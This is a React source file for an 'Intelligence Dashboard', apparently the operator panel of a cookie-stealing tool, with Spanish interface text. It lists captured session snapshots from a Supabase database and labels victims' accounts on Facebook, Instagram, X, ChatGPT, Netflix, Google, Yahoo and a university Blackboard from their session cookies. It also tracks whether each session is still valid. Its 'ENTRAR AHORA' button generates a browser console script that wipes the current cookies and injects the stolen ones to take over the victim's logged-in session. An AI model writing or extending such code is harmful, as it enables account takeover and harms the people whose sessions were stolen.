"use client";

import React, { useEffect, useState } from "react";
import { supabase, SessionSnapshot, Cookie } from "@/lib/supabase";
import GlassCard from "@/components/GlassCard";
import { 
  Search, Clock, Globe, ExternalLink, 
  Shield, Facebook, Instagram, GraduationCap, LayoutGrid, List, Check, Copy,
  Twitter, MessageSquare, Play, AlertCircle, Palette, Gamepad2, Mail, Bot
} from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";

interface AccountInfo {
  platform: string;
  identifier: string;
  icon: any;
  color: string;
  health: "active" | "expiring" | "expired";
}

const formatRelativeTime = (date: string) => {
  const now = new Date();
  const captured = new Date(date);
  const diffInSeconds = Math.floor((now.getTime() - captured.getTime()) / 1000);

  if (diffInSeconds < 60) return "just now";
  if (diffInSeconds < 3600) return `${Math.floor(diffInSeconds / 60)}m ago`;
  if (diffInSeconds < 86400) return `${Math.floor(diffInSeconds / 3600)}h ago`;
  return captured.toLocaleDateString();
};

export default function SessionsPage() {
  const [sessions, setSessions] = useState<SessionSnapshot[]>([]);
  const [loading, setLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState("");
  const [selectedSession, setSelectedSession] = useState<SessionSnapshot | null>(null);
  const [cookies, setCookies] = useState<Cookie[]>([]);
  const [loadingCookies, setLoadingCookies] = useState(false);
  const [viewMode, setViewMode] = useState<"grid" | "list">("grid");
  const [accountMap, setAccountMap] = useState<Record<string, AccountInfo>>({});
  const [copied, setCopied] = useState(false);
  const [currentTime, setCurrentTime] = useState(new Date());

  useEffect(() => {
    fetchSessions();
    const timer = setInterval(() => setCurrentTime(new Date()), 30000);
    return () => clearInterval(timer);
  }, []);

  const getHealthStatus = (sessionCookies: Cookie[]): "active" | "expiring" | "expired" => {
    if (!sessionCookies || sessionCookies.length === 0) return "active"; // Non-expiring fallback
    const now = Date.now() / 1000;
    const oneWeek = 7 * 24 * 60 * 60;
    
    const indicators = ["c_user", "ds_user_id", "auth_token", "__Secure-next-auth.session-token", "SID", "NetflixId"];
    const sessionCookie = sessionCookies.find(c => indicators.includes(c.name));

    if (!sessionCookie || !sessionCookie.expiration_date) return "active";
    if (sessionCookie.expiration_date < now) return "expired";
    if (sessionCookie.expiration_date < now + oneWeek) return "expiring";
    return "active";
  };

  const identifyAccount = (sessionCookies: Cookie[], fallbackId: string): AccountInfo => {
    const health = getHealthStatus(sessionCookies);
    const domainStr = sessionCookies.map(c => c.domain.toLowerCase()).join(" ");

    // 1. Check for specific identifier cookies first (High confidence)
    if (domainStr.includes("facebook.com")) {
      const fbId = sessionCookies.find(c => c.name === "c_user")?.value;
      return { platform: "Facebook", identifier: fbId || "Facebook User", icon: Facebook, color: "text-blue-500", health };
    }
    if (domainStr.includes("instagram.com")) {
      const igId = sessionCookies.find(c => c.name === "ds_user_id")?.value;
      return { platform: "Instagram", identifier: igId || "Instagram Account", icon: Instagram, color: "text-pink-500", health };
    }
    if (domainStr.includes("x.com") || domainStr.includes("twitter.com")) {
      return { platform: "X / Twitter", identifier: "Social Account", icon: Twitter, color: "text-blue-400", health };
    }

    // 2. Fallback to general domain match
    if (domainStr.includes("chatgpt.com") || domainStr.includes("openai.com")) 
      return { platform: "ChatGPT", identifier: "AI Assistant", icon: MessageSquare, color: "text-emerald-400", health };
    
    if (domainStr.includes("kick.com"))
      return { platform: "Kick", identifier: "Streamer", icon: Gamepad2, color: "text-green-500", health };

    if (domainStr.includes("openart.ai") || domainStr.includes("nijijourney.com") || domainStr.includes("midjourney.com"))
      return { platform: "AI Arts", identifier: "Creator", icon: Palette, color: "text-purple-400", health };

    if (domainStr.includes("netflix.com"))
      return { platform: "Netflix", identifier: "Viewer", icon: Play, color: "text-red-600", health };

    if (domainStr.includes("yahoo.com"))
      return { platform: "Yahoo", identifier: "Mail User", icon: Mail, color: "text-purple-600", health };

    if (domainStr.includes("up.edu.pe") || domainStr.includes("blackboard.com"))
      return { platform: "Blackboard", identifier: "Student", icon: GraduationCap, color: "text-blue-400", health };

    if (domainStr.includes("google.com"))
      return { platform: "Google", identifier: "Google User", icon: Globe, color: "text-red-400", health };

    // 3. Catch-all for non-identified sessions that have some cookies
    if (sessionCookies.length > 0) {
      return { platform: "App / Web", identifier: "Active Session", icon: Bot, color: "text-amber-400", health };
    }

    return { platform: "Unknown", identifier: fallbackId || "Anonymous", icon: Shield, color: "text-gray-400", health: "active" };
  };

  const fetchSessions = async () => {
    setLoading(true);
    const { data: sessionData } = await supabase
      .from("session_snapshots")
      .select("*")
      .order("captured_at", { ascending: false })
      .limit(40);
    
    if (sessionData) {
      setSessions(sessionData);
      const sessionIds = sessionData.map(s => s.id);
      
      // OPTIMIZATION: Fetch more cookies (limit 5000) and ensure they are sorted/complete
      const { data: cookieData } = await supabase
        .from("cookies")
        .select("*")
        .in("snapshot_id", sessionIds)
        .limit(5000); // Massive boost to avoid pagination limits
      
      const newAccountMap: Record<string, AccountInfo> = {};
      sessionData.forEach(session => {
        const sessionCookies = cookieData?.filter(c => c.snapshot_id === session.id) || [];
        newAccountMap[session.id] = identifyAccount(sessionCookies, session.user_id);
      });
      setAccountMap(newAccountMap);
    }
    setLoading(false);
  };

  const fetchCookies = async (snapshotId: string) => {
    setLoadingCookies(true);
    const { data } = await supabase
      .from("cookies")
      .select("*")
      .eq("snapshot_id", snapshotId)
      .limit(1000);
    if (data) setCookies(data);
    setLoadingCookies(false);
  };

  const handleSessionClick = (session: SessionSnapshot) => {
    setSelectedSession(session);
    setCopied(false);
    fetchCookies(session.id);
  };

  const generateConsoleScript = () => {
    if (cookies.length === 0) return "";
    return `(function() {
  const cookies = ${JSON.stringify(cookies)};
  console.clear();
  console.log('%c [SessionSafe] Limpiando Sesión Previa... ', 'background: #f59e0b; color: #fff; font-weight: bold; border-radius: 4px; padding: 5px;');
  
  document.cookie.split(";").forEach(function(c) { 
    document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
    document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/;domain=" + location.hostname.replace(/^www\./, "."));
  });

  console.log('%c [SessionSafe] Inyectando ' + cookies.length + ' cookies... ', 'background: #2563eb; color: #fff; font-weight: bold; border-radius: 4px; padding: 5px;');
  
  cookies.forEach(c => {
    try {
      document.cookie = c.name + '=' + encodeURIComponent(c.value) + 
                      '; domain=' + c.domain + 
                      '; path=' + (c.path || '/') + 
                      '; SameSite=Lax; Secure';
    } catch (e) {}
  });
  
  console.log('%c ¡ÉXITO! Recargando... ', 'color: #10b981; font-weight: bold;');
  setTimeout(() => location.reload(), 1500);
})();`;
  };

  const copyToClipboard = () => {
    const script = generateConsoleScript();
    if (!script) return;
    navigator.clipboard.writeText(script).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 5000);
    }).catch(() => prompt("Copia este código:", script));
  };

  const filteredSessions = sessions.filter(s => 
    s.user_id?.toLowerCase().includes(searchTerm.toLowerCase()) ||
    accountMap[s.id]?.identifier.toLowerCase().includes(searchTerm.toLowerCase()) ||
    accountMap[s.id]?.platform.toLowerCase().includes(searchTerm.toLowerCase())
  );

  return (
    <div className="space-y-8 max-w-7xl mx-auto pb-40">
      <header className="flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div>
          <h2 className="text-3xl font-bold tracking-tight">Intelligence Dashboard</h2>
          <p className="text-gray-400">Monitoring {sessions.length} sessions with domain-level intelligence.</p>
        </div>
        
        <div className="flex items-center gap-3">
          <div className="glass flex items-center px-4 py-2 rounded-2xl border border-white/10 focus-within:border-blue-500/50 transition-colors w-full md:w-64">
            <Search className="text-gray-500 mr-2" size={18} />
            <input 
              type="text" 
              placeholder="Search platform or ID..." 
              className="bg-transparent border-none outline-none text-sm w-full py-2"
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
            />
          </div>
          <button onClick={fetchSessions} className="glass p-2.5 rounded-xl hover:bg-white/5 transition-colors">
            <Clock size={20} className={loading ? "animate-spin text-blue-400" : "text-gray-400"} />
          </button>
        </div>
      </header>

      {loading ? (
        <div className="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-4 gap-6">
          {[1, 2, 3, 4, 5, 6, 7, 8].map(i => <div key={i} className="h-48 glass rounded-3xl animate-pulse" />)}
        </div>
      ) : (
        <div className="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-4 gap-6">
          {filteredSessions.map((session, idx) => {
            const info = accountMap[session.id] || { platform: "Unknown", identifier: "Anonymous", icon: Shield, color: "text-gray-500", health: "active" };
            return (
              <motion.div
                key={session.id}
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: idx * 0.05 }}
                onClick={() => handleSessionClick(session)}
                className={`glass p-6 rounded-3xl cursor-pointer border-2 transition-all hover:scale-[1.03] active:scale-[0.98] ${selectedSession?.id === session.id ? "border-blue-500 shadow-xl shadow-blue-500/20 bg-blue-500/5" : "border-transparent hover:border-white/10"}`}
              >
                <div className="flex items-start justify-between mb-4">
                  <div className={`p-3 rounded-2xl bg-white/5 ${info.color}`}>
                    <info.icon size={28} />
                  </div>
                  <div className="flex flex-col items-end gap-1">
                    <div className="glass-pill px-3 py-1 rounded-full text-[10px] font-bold uppercase tracking-wider text-gray-400">
                      {info.platform}
                    </div>
                    <div className={`text-[9px] font-bold uppercase px-2 py-0.5 rounded-full flex items-center gap-1 ${
                      info.health === "active" ? "bg-emerald-500/10 text-emerald-400" :
                      info.health === "expiring" ? "bg-amber-500/10 text-amber-400" :
                      "bg-red-500/10 text-red-400"
                    }`}>
                      <div className={`w-1 h-1 rounded-full ${
                        info.health === "active" ? "bg-emerald-500" :
                        info.health === "expiring" ? "bg-amber-500" :
                        "bg-red-500"
                      }`} />
                      {info.health}
                    </div>
                  </div>
                </div>
                <div>
                  <h4 className="font-bold text-lg truncate mb-1">{info.identifier}</h4>
                  <div className="flex items-center gap-2 text-xs text-gray-500">
                    <Clock size={12} />
                    {formatRelativeTime(session.captured_at)}
                  </div>
                </div>
              </motion.div>
            );
          })}
        </div>
      )}

      <AnimatePresence>
        {selectedSession && (
          <motion.div 
            initial={{ opacity: 0, y: 100 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: 100 }}
            className="fixed bottom-0 left-0 right-0 p-8 z-50 pointer-events-none"
          >
            <div className="max-w-4xl mx-auto pointer-events-auto">
              <GlassCard className="border-t-2 border-blue-500 shadow-[0_-20px_80px_rgba(0,0,0,0.8)] bg-black/90 backdrop-blur-2xl px-8 py-6">
                <div className="flex flex-col md:flex-row items-center justify-between gap-6">
                  <div className="flex items-center gap-5">
                    <div className={`p-4 rounded-3xl bg-white/5 ${accountMap[selectedSession.id]?.color}`}>
                      {accountMap[selectedSession.id]?.icon && React.createElement(accountMap[selectedSession.id].icon, { size: 48 })}
                    </div>
                    <div>
                      <div className="flex items-center gap-3">
                        <h3 className="text-2xl font-bold">{accountMap[selectedSession.id]?.identifier}</h3>
                        <div className="text-[10px] font-bold text-blue-400 bg-blue-500/10 px-2 py-0.5 rounded-lg border border-blue-500/20">
                          {cookies.length} COOKIES FETCHED
                        </div>
                      </div>
                      <p className="text-gray-400 capitalize">Advanced inyecting for {accountMap[selectedSession.id]?.platform}</p>
                    </div>
                  </div>
                  
                  <div className="flex gap-4">
                    <button onClick={() => setSelectedSession(null)} className="px-6 py-4 rounded-2xl glass hover:bg-white/10 transition-colors font-bold text-gray-400">Cerrar</button>
                    <button onClick={copyToClipboard} className={"flex items-center gap-3 px-10 py-4 rounded-2xl transition-all font-black text-xl shadow-2xl active:scale-95 group " + (copied ? "bg-emerald-600" : "bg-blue-600 hover:bg-blue-500")}>
                      {copied ? <><Check size={24} /> COPIADO</> : <><Copy size={24} /> ENTRAR AHORA</>}
                    </button>
                  </div>
                </div>
              </GlassCard>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
